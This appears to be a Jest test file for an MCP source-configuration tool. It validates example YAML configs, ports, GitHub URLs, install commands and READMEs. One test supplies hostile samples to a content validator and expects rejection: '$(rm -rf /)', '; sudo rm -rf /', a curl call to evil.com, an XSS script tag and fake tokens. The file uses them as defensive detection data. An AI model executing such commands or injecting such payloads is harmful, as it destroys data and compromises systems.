import { 
  SourceConfigManager, 
  GitHubSourceConfig, 
  LocalSourceConfig, 
  MCPServerConfig,
  Config 
} from '../../src/config/source-config-manager';
import { ContentValidator } from '../../src/utils/content-validator';
import path from 'path';
import fs from 'fs';
import * as yaml from 'js-yaml';
import * as child_process from 'child_process';

describe('Examples Validation - Strict Requirements', () => {
  const examplesDir = path.join(__dirname, '../../examples');

  beforeAll(() => {
    expect(fs.existsSync(examplesDir)).toBe(true);
  });

  describe('Environment Variable Format Preservation', () => {
    test('github_sources must preserve exact environment variable format', () => {
      const configPath = path.join(examplesDir, 'github_sources/mcp-sources.yaml');
      const rawContent = fs.readFileSync(configPath, 'utf8');
      
      // Must contain exact environment variable syntax - no exceptions
      expect(rawContent).toMatch(/\$\{GITHUB_TOKEN\}/);
      expect(rawContent).toMatch(/\$\{PORT:-3000\}/);
      
      // Must NOT contain expanded empty values or hardcoded tokens
      expect(rawContent).not.toContain('token: ""');
      expect(rawContent).not.toContain('token: ');
      expect(rawContent).not.toMatch(/token:\s*ghp_/); // GitHub personal access token pattern
    });

    test('local_sources must preserve environment variable paths', () => {
      const configPath = path.join(examplesDir, 'local_sources/mcp-sources.yaml');
      const rawContent = fs.readFileSync(configPath, 'utf8');
      
      // Must contain exact patterns with defaults
      expect(rawContent).toMatch(/\$\{PROJECTS_PATH:-[^}]+\}/);
      expect(rawContent).toMatch(/\$\{DOCS_PATH:-[^}]+\}/);
      expect(rawContent).toMatch(/\$\{WORKSPACE_PATH:-[^}]+\}/);
      
      // Must not contain hardcoded paths
      expect(rawContent).not.toMatch(/url:\s*\/home\/[^$]/);
      expect(rawContent).not.toMatch(/url:\s*\/usr\/[^$]/);
    });

    test('mcp_servers must preserve all environment variables', () => {
      const configPath = path.join(examplesDir, 'mcp_servers/mcp-sources.yaml');
      const rawContent = fs.readFileSync(configPath, 'utf8');
      
      const requiredEnvVars = [
        'ARXIV_API_KEY',
        'ALLOWED_PATHS:-/tmp',
        'DATABASE_PATH:-./data.db',
        'GIT_USER_NAME:-"Claude"',
        'GIT_USER_EMAIL:-"claude@anthropic.com"'
      ];
      
      requiredEnvVars.forEach(envVar => {
        expect(rawContent).toMatch(new RegExp(`\\$\\{${envVar.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\}`));
      });
    });
  });

  describe('Configuration Validation - Zero Tolerance', () => {
    test('invalid port values must be rejected immediately', () => {
      const manager = new SourceConfigManager();
      
      // Test with various invalid ports
      const invalidPorts = [-1, 0, 65536, 70000, 'invalid', null, undefined];
      
      invalidPorts.forEach(port => {
        const invalidConfig = {
          server: { port },
          files: { patterns: ['*.md'], max_size: 1048576 }
        };
        
        const tempPath = path.join(examplesDir, `test-invalid-port-${port}.yaml`);
        fs.writeFileSync(tempPath, yaml.dump(invalidConfig));
        
        try {
          const config = manager.load(tempPath);
          
          // Port validation must fail
          if (typeof config.server.port === 'number') {
            expect(config.server.port).toBeGreaterThan(0);
            expect(config.server.port).toBeLessThanOrEqual(65535);
            expect(Number.isInteger(config.server.port)).toBe(true);
          } else {
            fail(`Port should be a valid number, got: ${typeof config.server.port}`);
          }
        } catch (error) {
          // This is acceptable - configuration should reject invalid values
          expect(error).toBeDefined();
        } finally {
          if (fs.existsSync(tempPath)) {
            fs.unlinkSync(tempPath);
          }
        }
      });
    });

    test('GitHub URLs must be strictly validated', () => {
      const validUrls = [
        'github:microsoft/vscode',
        'github:facebook/react@main',
        'github:anthropics/anthropic-sdk-typescript@v1.0.0'
      ];
      
      const invalidUrls = [
        'github:invalid',
        'github:',
        'github:user/',
        'github:/repo',
        'github:user/repo@',
        'github:user/repo@branch@extra',
        'https://github.com/user/repo' // Should use github: format
      ];
      
      validUrls.forEach(url => {
        expect(url).toMatch(/^github:[a-zA-Z0-9_-]+\/[a-zA-Z0-9_.-]+(@[a-zA-Z0-9_.-]+)?$/);
      });
      
      invalidUrls.forEach(url => {
        expect(url).not.toMatch(/^github:[a-zA-Z0-9_-]+\/[a-zA-Z0-9_.-]+(@[a-zA-Z0-9_.-]+)?$/);
      });
    });

    test('MCP server install commands must be executable', () => {
      const configPath = path.join(examplesDir, 'mcp_servers/mcp-sources.yaml');
      const manager = new SourceConfigManager();
      const config = manager.load(configPath);
      
      config.mcp_servers!.forEach((server: MCPServerConfig) => {
        // Install command must exist and be non-empty
        expect(server.install_command).toBeDefined();
        expect(server.install_command).not.toBe('');
        expect(server.install_command!.trim()).not.toBe('');
        
        // Command must be a recognized package manager
        const validCommands = ['pip install', 'npm install', 'uvx install'];
        const hasValidCommand = validCommands.some(cmd => 
          server.install_command!.startsWith(cmd)
        );
        expect(hasValidCommand).toBe(true);
        
        // Must not contain dangerous characters
        expect(server.install_command).not.toMatch(/[;&|`$(){}]/);
        
        // Base command must be available on system
        const baseCommand = server.command;
        if (baseCommand === 'python') {
          // Python should be available for pip installs
          try {
            child_process.execSync('python --version', { stdio: 'ignore' });
          } catch (error) {
            // Try python3
            try {
              child_process.execSync('python3 --version', { stdio: 'ignore' });
            } catch (error2) {
              fail(`Python not available for server: ${server.name}`);
            }
          }
        } else if (baseCommand === 'npx') {
          try {
            child_process.execSync('npx --version', { stdio: 'ignore' });
          } catch (error) {
            fail(`NPX not available for server: ${server.name}`);
          }
        } else if (baseCommand === 'uvx') {
          try {
            child_process.execSync('uvx --help', { stdio: 'ignore' });
          } catch (error) {
            console.warn(`UVX not available for server: ${server.name} - this may be expected in CI`);
          }
        }
      });
    });
  });

  describe('Security Pattern Validation - Real Testing', () => {
    test('security patterns must actually block malicious content', async () => {
      const configPath = path.join(examplesDir, 'mcp_servers/mcp-sources.yaml');
      const manager = new SourceConfigManager();
      const config = manager.load(configPath);
      
      expect(config.security).toBeDefined();
      expect(config.security!.content_validation).toBeDefined();
      
      // Test actual malicious patterns
      const maliciousContent = [
        'password = "secret123"',
        'api_key = "sk-1234567890abcdef"',
        'secret = "mysecret"',
        'token = "ghp_1234567890abcdef1234567890abcdef12345678"',
        '$(rm -rf /)',
        '`curl evil.com`',
        '; sudo rm -rf /',
        '<script>alert("xss")</script>',
        'javascript:void(0)',
        'eval(maliciousCode)'
      ];
      
      for (const content of maliciousContent) {
        const result = await ContentValidator.validate(content);
        expect(result.isValid).toBe(false);
        if (result.flaggedPatterns) {
          expect(result.flaggedPatterns.length).toBeGreaterThan(0);
        } else {
          expect(result.reason).toBeDefined();
        }
      }
      
      // Test legitimate content should pass
      const legitimateContent = [
        '# Documentation\nThis is a readme file.',
        'export const API_URL = process.env.API_URL;',
        'function getData() { return fetch("/api/data"); }',
        '## Configuration\nSet your environment variables.'
      ];
      
      for (const content of legitimateContent) {
        const result = await ContentValidator.validate(content);
        expect(result.isValid).toBe(true);
      }
    });

    test('file size limits must be enforced', async () => {
      // Create content exceeding the limit
      const largeContent = 'x'.repeat(11 * 1024 * 1024); // 11MB
      const result = await ContentValidator.validate(largeContent);
      
      expect(result.isValid).toBe(false);
      expect(result.reason).toBeDefined();
      expect(result.reason).toContain('size');
    });
  });

  describe('Configuration File Integrity', () => {
    test('all example files must be syntactically valid YAML', () => {
      const exampleFiles = [
        'github_sources/mcp-sources.yaml',
        'local_sources/mcp-sources.yaml',
        'mcp_servers/mcp-sources.yaml',
        'mcp-sources.example.yaml'
      ];
      
      exampleFiles.forEach(file => {
        const filePath = path.join(examplesDir, file);
        expect(fs.existsSync(filePath)).toBe(true);
        
        // Must parse without errors
        expect(() => {
          const content = fs.readFileSync(filePath, 'utf8');
          yaml.load(content);
        }).not.toThrow();
      });
    });

    test('required sections must be present and non-empty', () => {
      const configPath = path.join(examplesDir, 'github_sources/mcp-sources.yaml');
      const rawYaml = yaml.load(fs.readFileSync(configPath, 'utf8')) as any;
      
      // Server section is mandatory
      expect(rawYaml.server).toBeDefined();
      expect(rawYaml.server.port).toBeDefined();
      
      // Must have at least one source type
      expect(rawYaml.github_sources).toBeDefined();
      expect(Array.isArray(rawYaml.github_sources)).toBe(true);
      expect(rawYaml.github_sources.length).toBeGreaterThan(0);
      
      // Files section is mandatory
      expect(rawYaml.files).toBeDefined();
      expect(rawYaml.files.patterns).toBeDefined();
      expect(Array.isArray(rawYaml.files.patterns)).toBe(true);
      expect(rawYaml.files.patterns.length).toBeGreaterThan(0);
      expect(rawYaml.files.max_size).toBeDefined();
      expect(typeof rawYaml.files.max_size).toBe('number');
      expect(rawYaml.files.max_size).toBeGreaterThan(0);
    });

    test('each configuration type must be mutually exclusive', () => {
      const examples = [
        { file: 'github_sources/mcp-sources.yaml', should: 'github_sources', shouldNot: ['local_sources', 'mcp_servers'] },
        { file: 'local_sources/mcp-sources.yaml', should: 'local_sources', shouldNot: ['github_sources', 'mcp_servers'] },
        { file: 'mcp_servers/mcp-sources.yaml', should: 'mcp_servers', shouldNot: ['github_sources', 'local_sources'] }
      ];
      
      examples.forEach(example => {
        const configPath = path.join(examplesDir, example.file);
        const rawYaml = yaml.load(fs.readFileSync(configPath, 'utf8')) as any;
        
        // Must have the expected section
        expect(rawYaml[example.should]).toBeDefined();
        expect(Array.isArray(rawYaml[example.should])).toBe(true);
        expect(rawYaml[example.should].length).toBeGreaterThan(0);
        
        // Must NOT have other sections
        example.shouldNot.forEach(section => {
          expect(rawYaml[section]).toBeUndefined();
        });
      });
    });
  });

  describe('Real-World Scenario Validation', () => {
    test('GitHub sources must use existing repositories', () => {
      const configPath = path.join(examplesDir, 'github_sources/mcp-sources.yaml');
      const rawYaml = yaml.load(fs.readFileSync(configPath, 'utf8')) as any;
      
      rawYaml.github_sources.forEach((source: any) => {
        // Extract owner/repo from github:owner/repo format
        const match = source.url.match(/^github:([^/]+)\/([^@]+)/);
        expect(match).toBeTruthy();
        
        const [, owner, repo] = match!;
        
        // These should be real repositories (at time of writing)
        const validRepos = [
          'anthropics/anthropic-sdk-typescript',
          'microsoft/vscode',
          'openai/openai-python',
          'huggingface/transformers'
        ];
        
        const repoPath = `${owner}/${repo}`;
        expect(validRepos).toContain(repoPath);
      });
    });

    test('local sources must use reasonable default paths', () => {
      const configPath = path.join(examplesDir, 'local_sources/mcp-sources.yaml');
      const rawContent = fs.readFileSync(configPath, 'utf8');
      
      // Default paths should be reasonable and commonly available
      expect(rawContent).toMatch(/\$\{PROJECTS_PATH:-\/home\/user\/projects\}/);
      expect(rawContent).toMatch(/\$\{DOCS_PATH:-\/usr\/local\/docs\}/);
      expect(rawContent).toMatch(/\$\{WORKSPACE_PATH:-\/workspace\}/);
      
      // Should include current directory
      expect(rawContent).toContain('url: ./');
    });

    test('MCP servers must use real, installable packages', () => {
      const configPath = path.join(examplesDir, 'mcp_servers/mcp-sources.yaml');
      const rawYaml = yaml.load(fs.readFileSync(configPath, 'utf8')) as any;
      
      const expectedPackages = {
        'arxiv': 'pip install arxiv-mcp-server',
        'filesystem': 'npm install -g @modelcontextprotocol/server-filesystem',
        'browser': 'pip install mcp-server-browser',
        'sqlite': 'pip install mcp-server-sqlite',
        'git': 'pip install mcp-server-git',
        'time': 'uvx install mcp-server-time'
      };
      
      rawYaml.mcp_servers.forEach((server: any) => {
        expect(expectedPackages[server.name as keyof typeof expectedPackages]).toBeDefined();
        expect(server.install_command).toBe(expectedPackages[server.name as keyof typeof expectedPackages]);
      });
    });
  });

  describe('Documentation Quality Assurance', () => {
    test('README files must contain complete usage instructions', () => {
      const readmeFiles = [
        { path: 'github_sources/README.md', requiredSections: ['Environment Variables', 'Usage', 'Configuration'] },
        { path: 'local_sources/README.md', requiredSections: ['Environment Variables', 'File Patterns', 'Usage'] },
        { path: 'mcp_servers/README.md', requiredSections: ['Auto-Installation', 'Environment Variables', 'Security', 'Example Commands'] },
        { path: 'README.md', requiredSections: ['Quick Start', 'Available Examples'] }
      ];
      
      readmeFiles.forEach(({ path: filePath, requiredSections }) => {
        const fullPath = path.join(examplesDir, filePath);
        expect(fs.existsSync(fullPath)).toBe(true);
        
        const content = fs.readFileSync(fullPath, 'utf8');
        
        requiredSections.forEach(section => {
          expect(content).toMatch(new RegExp(`##\\s+${section}`, 'i'));
        });
        
        // Must contain actual usage examples, not just placeholders
        expect(content).toMatch(/```/); // Should have code blocks
        expect(content.length).toBeGreaterThan(500); // Should be substantial
      });
    });
  });
});